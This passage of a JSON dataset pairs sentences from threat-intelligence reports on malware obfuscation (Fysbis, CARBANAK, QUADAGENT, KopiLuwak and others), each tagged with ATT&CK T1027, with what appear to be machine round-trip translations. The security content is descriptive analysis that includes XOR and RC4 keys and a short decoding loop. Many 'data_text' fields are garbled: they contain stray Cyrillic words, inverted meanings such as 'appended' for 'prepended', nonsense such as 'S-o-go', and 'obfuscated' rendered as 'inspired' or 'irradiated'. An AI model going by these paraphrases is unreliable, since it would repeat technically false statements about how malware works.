            "en_text": "For comparison, if we were to inspect Fysbis “RemoteShell” associated strings in one of the stripped variants, we would only see the following:  Figure 3: Sofacy Fysbis stripped binary string references to RemoteShell capability Compare this with what is available from the non-stripped variant:  Figure 4: Sofacy Fysbis non-stripped binary strings referenes to RemoteShell capability Little static analysis gifts like these can help to speed defender enumeration of capabilities and – more importantly – further contribute to correlation and detection across related samples",
            "data_text": "By contrast, if we perform Fysbis \"RemoteShell\" related in one of the разборных, we would see only the following : Figure 3 : Sofacy Fysbis their links to binary line RemoteShell the ability to compare it with, which are available from нестриппированного, Figure 4 : Софатные Fysbis нестриппированные a binary line on the ability to RemoteShell The подар.Static analysis techniques such as these can help speed up the identification of the defender's capabilities and, more importantly, contribute to further correlation and detection among related samples."
        }
    ],
    "That malicious dll then loads encrypted shellcode from the binary, which is decrypted and runs the final BUGJUICE payload": [
        {
            "tec_id": "T1027",
            "en_text": "That malicious dll then loads encrypted shellcode from the binary, which is decrypted and runs the final BUGJUICE payload",
            "data_text": "This malicious dll then downloads the encrypted shellcode from binary, which is decrypted and starts the final BUGJUICE download"
        }
    ],
    "Messages are encrypted using AES with a static key": [
        {
            "tec_id": "T1027",
            "en_text": "Messages are encrypted using AES with a static key",
            "data_text": "Messages are encrypted using the AES static key"
        }
    ],
    "The 2.0 versions require a dropper to decipher and launch the AES encrypted QUASARRAT payload": [
        {
            "tec_id": "T1027",
            "en_text": "The 2.0 versions require a dropper to decipher and launch the AES encrypted QUASARRAT payload",
            "data_text": "Version 2.0 requires a drop to decrypt and launch an encrypted QUASARRAT AES cargo load"
        }
    ],
    "After the payload is launched, the shellcode runs the following commands to prevent Microsoft Word from showing a recovery dialog:   Lastly, the shellcode overwrites the malicious file with a decoy document related to the Indian defense forces’ pay scale / matrix (Figure 3), displays it to the user and terminates the exploited instance of Microsoft Word": [
        {
            "tec_id": "T1027",
            "en_text": "After the payload is launched, the shellcode runs the following commands to prevent Microsoft Word from showing a recovery dialog:   Lastly, the shellcode overwrites the malicious file with a decoy document related to the Indian defense forces’ pay scale / matrix (Figure 3), displays it to the user and terminates the exploited instance of Microsoft Word",
            "data_text": "After the useful boot, shellcode is the following commands, to prevent the dialogue of Microsoft Word : And finally, shellcode the United States a malicious file with декоированным the document, because of the scale of assessments / matrix in India of (Figure 3), shows its users and stop эксплуатируемый a copy of Microsoft. word"
        }
    ],
    "The code is obfuscated in order to hide any malicious activity on the remote server": [
        {
            "tec_id": "T1027",
            "en_text": "The code is obfuscated in order to hide any malicious activity on the remote server",
            "data_text": "The code has been fixed to hide any malicious activity on the remote server."
        }
    ],
    "Bxaki obfuscated function": [
        {
            "tec_id": "T1027",
            "en_text": "Bxaki obfuscated function",
            "data_text": "bxaki-obfuscated function"
        }
    ],
    "This strangeness was related to values listed in newer BlackEnergy configuration files": [
        {
            "tec_id": "T1027",
            "en_text": "This strangeness was related to values listed in newer BlackEnergy configuration files",
            "data_text": "This oddity was due to the values listed in the new BlackEnergy configuration files"
        }
    ],
    "Evidence also supports the hypothesis that there is a encryption plugin for victim files (see below)": [
        {
            "tec_id": "T1027",
            "en_text": "Evidence also supports the hypothesis that there is a encryption plugin for victim files (see below)",
            "data_text": "The evidence also supports the hypothesis that there is an encryption plug-in for victim files (see below)"
        }
    ],
    "Destructive dstr command in BE2 config file Also, on some machines, documents were encrypted, but no related plugin could be found": [
        {
            "tec_id": "T1027",
            "en_text": "Destructive dstr command in BE2 config file Also, on some machines, documents were encrypted, but no related plugin could be found",
            "data_text": "Some machines also had documents encrypted, but no corresponding plug-in was found."
        }
    ],
    "It is prepended to the encrypted and encoded message": [
        {
            "tec_id": "T1027",
            "en_text": "It is prepended to the encrypted and encoded message",
            "data_text": "It is appended to an encrypted and encrypted message"
        }
    ],
    "The headers are XOR encrypted with <hdrXORKey1> and <hdrXORKey2> combined and reversed": [
        {
            "tec_id": "T1027",
            "en_text": "The headers are XOR encrypted with <hdrXORKey1> and <hdrXORKey2> combined and reversed",
            "data_text": "XOR headers are encrypted with <hdrXORKey1> and <hdrXORKey2> combined and reverse"
        }
    ],
    "Build Tool Most of CARBANAK’s strings are encrypted in order to make analysis more difficult": [
        {
            "tec_id": "T1027",
            "en_text": "Build Tool Most of CARBANAK’s strings are encrypted in order to make analysis more difficult",
            "data_text": "Most CARB toolsANAK strings are encrypted to make analysis more complex"
        }
    ],
    "This build tool encrypts the binary’s strings with a fresh key for each build": [
        {
            "tec_id": "T1027",
            "en_text": "This build tool encrypts the binary’s strings with a fresh key for each build",
            "data_text": "This binary code string encryption tool with a fresh key for each build"
        }
    ],
    "Tool Type Internal Name Industry Name   Backdoor Poison Frog BONDUPDATER   Backdoor Glimpse Updated BONDUPDATER   Webshell HyperShell TwoFace loader   Webshell HighShell TwoFace payload   Webshell Minion TwoFace payload variant   DNS Hijacking Toolkit webmask Related to DNSpionage     Table 1": [
        {
            "tec_id": "T1027",
            "en_text": "Tool Type Internal Name Industry Name   Backdoor Poison Frog BONDUPDATER   Backdoor Glimpse Updated BONDUPDATER   Webshell HyperShell TwoFace loader   Webshell HighShell TwoFace payload   Webshell Minion TwoFace payload variant   DNS Hijacking Toolkit webmask Related to DNSpionage     Table 1",
            "data_text": "Tool Type Internal Industry Name Rear Poisoner Name Frog BONDUPDATER Rear Light BONDUPDATER Updated BONDUPDATER Website HyperShell Double Loader Web Site HighShell Double Useful Loader Web Site Minion TwoFace Variant DNS Hijacking Toolkit DNSmask Related Table 1"
        }
    ],
    "The HyperShell and HighShell webshells are variants of what we track as TwoFace, with HyperShell being related to the TwoFace loader and HighShell being related to the TwoFace payload, as we reported in July 2017": [
        {
            "tec_id": "T1027",
            "en_text": "The HyperShell and HighShell webshells are variants of what we track as TwoFace, with HyperShell being related to the TwoFace loader and HighShell being related to the TwoFace payload, as we reported in July 2017",
            "data_text": "The HyperShell and HighShell web shell are variants of what we track as TwoFace, with HyperShell linked to the TwoFace bootloader and HighShell linked to the TwoFace payload, as we reported in July 2017."
        }
    ],
    "Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim’s data": [
        {
            "tec_id": "T1027",
            "en_text": "Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim’s data",
            "data_text": "Encryption consists of XOR with a hard-coded key to configure it and RC4 with a predefined password to encrypt victim data"
        }
    ],
    "Configuration Config.ini is the file where the malware stores its encrypted configuration data": [
        {
            "tec_id": "T1027",
            "en_text": "Configuration Config.ini is the file where the malware stores its encrypted configuration data",
            "data_text": "Configuration Config.ini is a file in which malware stores its encrypted configuration data."
        }
    ],
    "These requests are encrypted using the RC4 algorithm": [
        {
            "tec_id": "T1027",
            "en_text": "These requests are encrypted using the RC4 algorithm",
            "data_text": "These requests are encrypted using the RC4 algorithm."
        }
    ],
    "While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C# payload was functionally similar to the original RogueRobin payload": [
        {
            "tec_id": "T1027",
            "en_text": "While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C# payload was functionally similar to the original RogueRobin payload",
            "data_text": "When analyzing shipping documents using the AppLocker .sct buy-west file, we noticed that the C# payload is functionally similar to the original RogueRobin payload"
        }
    ],
    "Figure 3 Targeted lure content In one of the documents, the victim is presented with what appears to be an obfuscated document with the NATO EOD seal and text alluding to the targeted nation state": [
        {
            "tec_id": "T1027",
            "en_text": "Figure 3 Targeted lure content In one of the documents, the victim is presented with what appears to be an obfuscated document with the NATO EOD seal and text alluding to the targeted nation state",
            "data_text": "Figure 3 Target content of the bait In one of the victim's documents presented with what appears to be a contrived document with the NATO EOD seal and a text referring to the nation's target state."
        }
    ],
    "The group clearly shows a preference for using a simple downloader like Zebrocy as first-stage payloads in these attacks": [
        {
            "tec_id": "T1027",
            "en_text": "The group clearly shows a preference for using a simple downloader like Zebrocy as first-stage payloads in these attacks",
            "data_text": "The group clearly prefers to use a simple downloader like Zebrocy as the first download stages in these attacks."
        }
    ],
    "APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property": [
        {
            "tec_id": "T1027",
            "en_text": "APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property",
            "data_text": "APT29 wrote an encrypted and base64-encoded PowerShell backdoor code to this property."
        }
    ],
    "When we converted the dates in the file strings from the Solar Hijri calendar to the Gregorian one, we found that they were close to the compilation times of the executables and also close to when Cadelle’s targets were initially compromised": [
        {
            "tec_id": "T1027",
            "en_text": "When we converted the dates in the file strings from the Solar Hijri calendar to the Gregorian one, we found that they were close to the compilation times of the executables and also close to when Cadelle’s targets were initially compromised",
            "data_text": "When we moved the dates in the file rows from the Solar Hijri Calendar to the Gregory Calendar, we found that they were close to the compilation time of executables and also close to when Cadella's goals were initially compromised."
        }
    ],
    "WindowsDefender.ini – The Base64 encoded and obfuscated PowerShell script": [
        {
            "tec_id": "T1027",
            "en_text": "WindowsDefender.ini – The Base64 encoded and obfuscated PowerShell script",
            "data_text": "Windows Defender.ini – PowerShell script, encoded and trained Base64"
        }
    ],
    "Some of the key obfuscation techniques used are:   Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult": [
        {
            "tec_id": "T1027",
            "en_text": "Some of the key obfuscation techniques used are:   Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult",
            "data_text": "Some of the key methods of decontamination are used in the form of: Replacement of symbols. Several cases of character replacement and string reversal methods (Figure 10) make analysis difficult."
        }
    ],
    "Figure 3: The first step of decryption will perform XOR on one byte using the previous adjacent byte, starting from the last byte and excluding the first byte  Figure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step as the RC4 key  Figure 5: Encrypted (Top) and decrypted (bottom) configuration file It is also important to note that while the loader component and the configuration file are located in the same directory (%windows%\\system32), the encrypted backdoor is located in a different directory (%Program Files%\\Common Files\\System\\ado)": [
        {
            "tec_id": "T1027",
            "en_text": "Figure 3: The first step of decryption will perform XOR on one byte using the previous adjacent byte, starting from the last byte and excluding the first byte  Figure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step as the RC4 key  Figure 5: Encrypted (Top) and decrypted (bottom) configuration file It is also important to note that while the loader component and the configuration file are located in the same directory (%windows%\\system32), the encrypted backdoor is located in a different directory (%Program Files%\\Common Files\\System\\ado)",
            "data_text": "Figure 3 : The first step of reading the will to carry out the XOR on the same bang through the the bytes, since the last bytes and including the bytes in Figure 4 : The second step using RC4, using the first 0x20, the bytes from the first step as RC4 the key is shown in Figure 5 : An encrypted (Top) and then (Bottom) a configuration file he такжеo it is important to note that while the component заг.the cutter and configuration file are in the same directory (%windows%\\system32), the encrypted back door is in another directory (%Program Files%\\).Shared Files\\System\\ado)"
        }
    ],
    "All strings used by the Trojan are encrypted with the XOR algorithm": [
        {
            "tec_id": "T1027",
            "en_text": "All strings used by the Trojan are encrypted with the XOR algorithm",
            "data_text": "All strings used by the Trojan are encrypted using the XOR algorithm"
        }
    ],
    "Next, the buffer is encrypted using the RC4 algorithm with the 50-byte key (also stored in the backdoor’s body)": [
        {
            "tec_id": "T1027",
            "en_text": "Next, the buffer is encrypted using the RC4 algorithm with the 50-byte key (also stored in the backdoor’s body)",
            "data_text": "The buffer is then encrypted using the RC4 algorithm with a 50-byte key (also stored in the back door housing)"
        }
    ],
    "11 bytes of this buffer are encrypted with the XOR algorithm as follows: i = 0 while ( 1 ) {   crypted_buffer = (_BYTE *)this_->crypted_buffer;   if ( i gt;= this-gt;crypted_buffer_size - 4 ) // this-gt;crypted_buffer_size == 15     break;   ++i;   crypted_buffer[i + 4] ^= crypted_buffer[i & 3];  The generated buffer in encoded using the BASE64 alphabet, where the last two characters are replaced with “-” and “_”": [],
    "Next, to the beginning of the BASE64 string a random BASE64 string with the length of 5 characters is added": [
        {
            "tec_id": "T1027",
            "en_text": "Next, to the beginning of the BASE64 string a random BASE64 string with the length of 5 characters is added",
            "data_text": "A random 5-character BASE64 string is added to the beginning of the BASE64 string."
        }
    ],
    "The first 11 bytes of the received buffer are encrypted with the XOR algorithm": [
        {
            "tec_id": "T1027",
            "en_text": "The first 11 bytes of the received buffer are encrypted with the XOR algorithm",
            "data_text": "The first 11 bytes of the received buffer are encrypted using the XOR algorithm"
        }
    ],
    "Once it is encrypted using the XOR algorithm, the buffer is encoded with BASE64": [
        {
            "tec_id": "T1027",
            "en_text": "Once it is encrypted using the XOR algorithm, the buffer is encoded with BASE64",
            "data_text": "After it is encrypted using the XOR algorithm, the buffer is encoded with BASE64"
        }
    ],
    "The launcher module, obfuscated with the notorious Metasploit’s shikata_ga_nai encoder, is the same for all the droppers": [
        {
            "tec_id": "T1027",
            "en_text": "The launcher module, obfuscated with the notorious Metasploit’s shikata_ga_nai encoder, is the same for all the droppers",
            "data_text": "The startup module, inspired by the well-known shikata_ga_nai codec, is the same for all droppers"
        }
    ],
    "These redirects were implemented by adding two malicious scripts obfuscated by a tool similar to the Dean Edwards packer": [
        {
            "tec_id": "T1027",
            "en_text": "These redirects were implemented by adding two malicious scripts obfuscated by a tool similar to the Dean Edwards packer",
            "data_text": "These redirects were implemented by adding two malicious scripts inspired by a tool similar to the Dean Edwards packer."
        }
    ],
    "Many of the Fetch samples we analyzed attempted to obfuscate their functionality by encrypting their embedded strings using AES": [
        {
            "tec_id": "T1027",
            "en_text": "Many of the Fetch samples we analyzed attempted to obfuscate their functionality by encrypting their embedded strings using AES",
            "data_text": "Many Fetch samples that we analyzed tried to quench their functionality by encrypting their embedded strings using AES"
        }
    ],
    "Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related": [
        {
            "tec_id": "T1027",
            "en_text": "Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related",
            "data_text": "Although earlier this activity was linked to a group of FIN7 threat actors, our research shows that this activity is related to espionage and is hardly related to FIN7."
        }
    ],
    "The domain names differed but the script adheres to the same logic (including the logic function).” The DNSMessenger malware is an obfuscated and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also referred to by FireEye as POWERSOURCE": [
        {
            "tec_id": "T1027",
            "en_text": "The domain names differed but the script adheres to the same logic (including the logic function).” The DNSMessenger malware is an obfuscated and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also referred to by FireEye as POWERSOURCE",
            "data_text": "Domain names were different, but the script adheres to the same logic (including the logical function). DNSMessenger malware is a focused and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also called POWERSOURCE."
        }
    ],
    "Malicious obfuscated VBA code is executed when the macro is first enabled": [
        {
            "tec_id": "T1027",
            "en_text": "Malicious obfuscated VBA code is executed when the macro is first enabled",
            "data_text": "Corrupted VBA code is executed when the macro is first enabled"
        }
    ],
    "The current version, HawkEye Reborn v9 has been modified from earlier versions and heavily obfuscated to make analysis more difficult.The email campaigns that have been observed feature characteristics that are consistent with what is commonly seen with malspam campaigns, with the emails purporting to be associated with various documents such as invoices, bills of materials, order confirmations, and other corporate functions": [
        {
            "tec_id": "T1027",
            "en_text": "The current version, HawkEye Reborn v9 has been modified from earlier versions and heavily obfuscated to make analysis more difficult.The email campaigns that have been observed feature characteristics that are consistent with what is commonly seen with malspam campaigns, with the emails purporting to be associated with various documents such as invoices, bills of materials, order confirmations, and other corporate functions",
            "data_text": "The current version of HawkEye Reborn v9 has been modified from previous versions and is strongly discouraged to make the analysis more complex.Observed email campaigns are characteristics that are consistent with what is typically seen with the malspam campaign, with email claiming to communicate with various documents such as accounts, invoices, materials, order confirmation, and other corporate functions"
        }
    ],
    "After decompiling it from the PE file, it is heavily obfuscated and still almost unreadable.We deobfuscated the script to understand how the infection process works": [
        {
            "tec_id": "T1027",
            "en_text": "After decompiling it from the PE file, it is heavily obfuscated and still almost unreadable.We deobfuscated the script to understand how the infection process works",
            "data_text": "After decompiling from a PE file, it is heavily irradiated and still almost unreadable.We deobfuscated the scenario to understand how the infection process works"
        }
    ],
    "The AutoIT script is offering a lot of other functions which are not used in this campaign, like anti-virtual machine detection, USB drive infection and others.The final payload — which we found in the AutoIT PE file resource section and was started by the process-hollowing shellcode — is a .NET PE file that's obfuscated with ConfuserEx": [
        {
            "tec_id": "T1027",
            "en_text": "The AutoIT script is offering a lot of other functions which are not used in this campaign, like anti-virtual machine detection, USB drive infection and others.The final payload — which we found in the AutoIT PE file resource section and was started by the process-hollowing shellcode — is a .NET PE file that's obfuscated with ConfuserEx",
            "data_text": "AutomobileIT script has many other features that are not used in this campaign, such as anti-virtual machine detection, USB disk infection, and others.The final load — which we found in the carIT PE resource section and was run by a process shell — is .NET PE file that overflows with ConfuserEx."
        }
    ],
    "In our analysis, the macro is obfuscated, character by character, using the decimal ASCII code": [
        {
            "tec_id": "T1027",
            "en_text": "In our analysis, the macro is obfuscated, character by character, using the decimal ASCII code",
            "data_text": "In our analysis, the macro is suffused, character by character, using decimal ASCII code"
        }
    ],
    "Code snippet of the obfuscated document After deobfuscation, we can see that the payload is written in the Perl programming language": [
        {
            "tec_id": "T1027",
            "en_text": "Code snippet of the obfuscated document After deobfuscation, we can see that the payload is written in the Perl programming language",
            "data_text": "After deobfuscation, we see that the payload is written in the Perl programming language."
        }
    ],
    "There are two forms of encrypted strings: an RSA256-encrypted string, and custom base64-encoded and RSA256-encrypted string": [
        {
            "tec_id": "T1027",
            "en_text": "There are two forms of encrypted strings: an RSA256-encrypted string, and custom base64-encoded and RSA256-encrypted string",
            "data_text": "There are two forms of encrypted strings: a string with RSA256 encryption and a user string with base64 and RSA256 encryption."
        }
    ],
    "All strings below are encrypted via AES256 and base64 encoding": [
        {
            "tec_id": "T1027",
            "en_text": "All strings below are encrypted via AES256 and base64 encoding",
            "data_text": "All lines below are encrypted using AES256 and base64 encoding"
        }
    ],
    "Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation": [
        {
            "tec_id": "T1027",
            "en_text": "Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation",
            "data_text": "Its developer used the Open Source Invoke-Obfuscation tool to inflate this PowerShell scenario, specifically using the COMPRESS method proposed by Invoke-Obfuscation."
        }
    ],
    "At face value, this current variant of OopsIE has a vast majority of its strings obfuscated, which can be deobfuscated by splitting the strings using the hyphen as a delimiter, treating each split value as an integer, subtracting one from each integer and converting each into a character": [
        {
            "tec_id": "T1027",
            "en_text": "At face value, this current variant of OopsIE has a vast majority of its strings obfuscated, which can be deobfuscated by splitting the strings using the hyphen as a delimiter, treating each split value as an integer, subtracting one from each integer and converting each into a character",
            "data_text": "By denomination, this current variant of OopsIE has a vast majority of its obfuscated strings, which can be deobfuscated by dividing the strings with a hyphen as delimiter, treating each fractured value as an integer, subtracting one from each integer and converting each into a symbol."
        }
    ],
    "The Trojan accesses two resources, named Sch and VBS that contains obfuscated strings that contain the command to create the scheduled task and the VBScript to run": [
        {
            "tec_id": "T1027",
            "en_text": "The Trojan accesses two resources, named Sch and VBS that contains obfuscated strings that contain the command to create the scheduled task and the VBScript to run",
            "data_text": "Trojan has access to two resources named Sch and VBS that contain trained strings that contain the create scheduled task command and VBScript to run"
        }
    ],
    "A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation": [
        {
            "tec_id": "T1027",
            "en_text": "A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation",
            "data_text": "A more thorough study found that the discouraging effect used by the OilRig group in these QUADAGENT samples was probably the result of using an open-source tool called Invoke-Obfuscation."
        }
    ],
    "This tool was originally intended to aid defenders in simulating obfuscated PowerShell commands to better their defenses": [
        {
            "tec_id": "T1027",
            "en_text": "This tool was originally intended to aid defenders in simulating obfuscated PowerShell commands to better their defenses",
            "data_text": "This tool was originally designed to assist defenders in simulating PowerShell inspired commands to improve their defense"
        }
    ],
    "Invoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks, which changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`) character, which is ignored in by PowerShell": [
        {
            "tec_id": "T1027",
            "en_text": "Invoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks, which changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`) character, which is ignored in by PowerShell",
            "data_text": "Invoke-Obfuscation is called by the variable fuse method used by actors to fuse this Random Case + {} + Ticks script, which changes all variables in the script to have random caesium characters, be surrounded by curved brackets, and include tick symbol (`) that is ignored by PowerShell"
        }
    ],
    "Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex": [
        {
            "tec_id": "T1027",
            "en_text": "Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex",
            "data_text": "Invoke-Obfuscation is called an obfuscation string used by actors to further obfuscate this Reorder script, which uses the string formatting function within PowerShell to recover strings from mismatched substrings (for example, in the case of using the string formatting function)."
        }
    ],
    "By applying two specific obfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this blog": [
        {
            "tec_id": "T1027",
            "en_text": "By applying two specific obfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this blog",
            "data_text": "Applying two special methods of sequencing in Invoke-Obfuscation enabled the creation of a PowerShell sequencing script that was very similar to what was done with QUADAGENT in the attacks discussed in this blog."
        }
    ],
    "All the strings and settings were encrypted and obfuscated": [
        {
            "tec_id": "T1027",
            "en_text": "All the strings and settings were encrypted and obfuscated",
            "data_text": "All lines and settings have been encrypted and encrypted"
        }
    ],
    "The configuration and strings are encrypted using 3DES and Base64 encoding": [
        {
            "tec_id": "T1027",
            "en_text": "The configuration and strings are encrypted using 3DES and Base64 encoding",
            "data_text": "Configuration and strings are encrypted using 3DES and Base64 encoding"
        }
    ],
    "The C&C server then replies with the encrypted serialized configuration": [
        {
            "tec_id": "T1027",
            "en_text": "The C&C server then replies with the encrypted serialized configuration",
            "data_text": "S-o-go"
        }
    ],
    "The shellcode is not encrypted but is obfuscated": [
        {
            "tec_id": "T1027",
            "en_text": "The shellcode is not encrypted but is obfuscated",
            "data_text": "Shell code is not encrypted, but is fuzzy"
        }
    ],
    "Decrypting the Configuration As previously mentioned, the real configuration data is stored in the first stage shellcode but it is not stored in cleartext, but encrypted and compressed": [
        {
            "tec_id": "T1027",
            "en_text": "Decrypting the Configuration As previously mentioned, the real configuration data is stored in the first stage shellcode but it is not stored in cleartext, but encrypted and compressed",
            "data_text": "As mentioned earlier, the actual configuration data is stored in the first stage of shellcode, but is not stored in clear text, but is encrypted and compressed."
        }
    ],
    "The configuration data is encrypted with the same algorithm described previously by JPCert but using a different XOR value": [
        {
            "tec_id": "T1027",
            "en_text": "The configuration data is encrypted with the same algorithm described previously by JPCert but using a different XOR value",
            "data_text": "Configuration data is encrypted with the same algorithm as previously described by JPCert, but using a different XOR value"
        }
    ],
    "The configuration blob is encoded using a simple single-byte XOR scheme": [
        {
            "tec_id": "T1027",
            "en_text": "The configuration blob is encoded using a simple single-byte XOR scheme",
            "data_text": "Configuration blobs are encoded using a simple one-byte XOR scheme"
        }
    ],
    "KopiLuwak In November 2016, Kaspersky Lab observed a new round of weaponized macro documents that dropped a new, heavily obfuscated Javascript payload that we named KopiLuwak (one of the rarest and most expensive types of coffee in the world)": [
        {
            "tec_id": "T1027",
            "en_text": "KopiLuwak In November 2016, Kaspersky Lab observed a new round of weaponized macro documents that dropped a new, heavily obfuscated Javascript payload that we named KopiLuwak (one of the rarest and most expensive types of coffee in the world)",
            "data_text": "CopiLuwak In November 2016, Kaspersky Lab observed a new round of armed macros that dropped a new, heavily inspired Javascript payload that we called CopiLuwak (one of the rarest and most expensive coffee types in the world)"
        }
    ],
    "The payload (abbad7acd…) is an executable that appears to have been created by a VBScript to Executable tool and further obfuscated with a cryptor": [
        {
            "tec_id": "T1027",
            "en_text": "The payload (abbad7acd…) is an executable that appears to have been created by a VBScript to Executable tool and further obfuscated with a cryptor",
            "data_text": "The download (abbad7acd…) is executable, which appears to have been created by the VBScript to Executable tool and further irradiated by the encoder."
        }
    ],
    "Figure 3: no detections for SpeakUp in Virus Total In an attempt to endure the investigation process by security researchers, the second stage payload was encoded with salted base64": [
        {
            "tec_id": "T1027",
            "en_text": "Figure 3: no detections for SpeakUp in Virus Total In an attempt to endure the investigation process by security researchers, the second stage payload was encoded with salted base64",
            "data_text": "Figure 3: No SpeakUp Detection in Total Virus In an attempt to withstand the security investigation process, the second phase of payload was encoded by a saline base64"
        }
    ],
    "Some strings are obfuscated with XOR x56": [
        {
            "tec_id": "T1027",
            "en_text": "Some strings are obfuscated with XOR x56",
            "data_text": "Some lines are fuzzy XOR x56"
        }
    ],
    "These files are stored within an 217kb encrypted cab file in the dropper’s resources under the name “A”": [
        {
            "tec_id": "T1027",
            "en_text": "These files are stored within an 217kb encrypted cab file in the dropper’s resources under the name “A”",
            "data_text": "These files are stored in an encrypted 217kb taxi file in a dropper resource named \"A\""
        }
    ],
    "The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: \\x36\\x11\\xdd\\x08\\xac\\x4b\\x72\\xf8\\x51\\x04\\x68\\x2e\\x3e\\x38\\x64\\x32": [
        {
            "tec_id": "T1027",
            "en_text": "The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: \\x36\\x11\\xdd\\x08\\xac\\x4b\\x72\\xf8\\x51\\x04\\x68\\x2e\\x3e\\x38\\x64\\x32",
            "data_text": "The cabin file was encrypted and decrypted using simple xor encryption with a 16-byte rotary key: \\x36\\x11\\xdd\\x08\\x4b\\x72\\xf8\\x51\\x04\\x68\\x2e\\x3e\\x38\\x64\\x32"
        }
    ],
    "This is encrypted by RC4, using the key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0xed, 0x91, 0x62}": [],
    "We’ve identified two such files: settings.db sdfg3d.db Here’s how such a database file appears:  These are BASE64 encoded and use the same RC4 encryption key as the malware configuration": [
        {
            "tec_id": "T1027",
            "en_text": "We’ve identified two such files: settings.db sdfg3d.db Here’s how such a database file appears:  These are BASE64 encoded and use the same RC4 encryption key as the malware configuration",
            "data_text": "We defined two such files: sdfg3d.db Here's how such a database file appears: These are BASE64 encoded and use the same RC4 encryption key as the malware configuration"
        }
    ],
    "The CARROTBAT malware family is a somewhat unique dropper and while it supports various types of decoy documents, and employs rudimentary command obfuscation, it should be made clear that it is not sophisticated": [
        {
            "tec_id": "T1027",
            "en_text": "The CARROTBAT malware family is a somewhat unique dropper and while it supports various types of decoy documents, and employs rudimentary command obfuscation, it should be made clear that it is not sophisticated",
            "data_text": "CARROTBAT's malware family is somewhat unique drip, and although it supports various types of underwater documents, and uses rudimentary team desecration, it should be made clear that it is not complicated."
        }
    ],
    "Embedded Trojan This Trojan loaded by the first payload contains several embedded executables that it uses to ultimately download and execute a secondary payload, as well as downloading and opening a decoy document": [
        {
            "tec_id": "T1027",
            "en_text": "Embedded Trojan This Trojan loaded by the first payload contains several embedded executables that it uses to ultimately download and execute a secondary payload, as well as downloading and opening a decoy document",
            "data_text": "Built-in Trojan This Trojan loaded with the first payload contains several built-in executable files that it uses to download and perform a secondary payload, as well as to download and open a document for a subnet"
        }
    ],
    "HttpBrowser's executable code may be obfuscated through structured exception handling and return-oriented programming": [
        {
            "tec_id": "T1027",
            "en_text": "HttpBrowser's executable code may be obfuscated through structured exception handling and return-oriented programming",
            "data_text": "Executable HttpBrowser code can be obfuscated by structural exception processing and returnable programming."
        }
    ],
    "Navigating to the web page manually to view:source reveals the code, which at the time of writing happened to not be obfuscated in any significant way": [
        {
            "tec_id": "T1027",
            "en_text": "Navigating to the web page manually to view:source reveals the code, which at the time of writing happened to not be obfuscated in any significant way",
            "data_text": "Manually switching to a web page to view:source reveals code that was not inspired in any significant way at the time of writing"
        }
    ],
    "All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks": [
        {
            "tec_id": "T1027",
            "en_text": "All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks",
            "data_text": "All third-party trademarks mentioned by Cofense, whether the logo, name or form of the product, or otherwise, remain the property of their respective owners, and the use of these trademarks in no way indicates the relationship between Cofense and trademark owners."
        }
    ],
    "Figure 7: The same de-obfuscated code as Figure 2 The only other script content of the blog-page[.]html is an empty script section": [
        {
            "tec_id": "T1027",
            "en_text": "Figure 7: The same de-obfuscated code as Figure 2 The only other script content of the blog-page[.]html is an empty script section",
            "data_text": "Figure 7: Same de-fuzzy code as Figure 2 The only other script content on the blog page[.]html is an empty script section"
        }
    ],
    "PlayList.vbs contains the obfuscated codes, which it executes after decrypting the obfuscations.": [],
    "Once executed, Vcrodat loads an encrypted payload on to the victim’s computer.": [],
    "Figure 3 shows this webshell’s code that will run supplied JScript provided in base64 encoded format within the URL within a parameter": [],
    "The file uses a character insertion obfuscation technique, making it appear to contain Chinese characters.": [],
    "The JavaScript is heavily obfuscated. The first variable—a—is an array of obfuscated values": [],
    "This shellcode is decrypted in memory through EQENDT32.EXE": [],
    "The encrypted file contains a config file of 0x78 bytes. The data is decrypted with an 0xD9 XOR operation.": [],
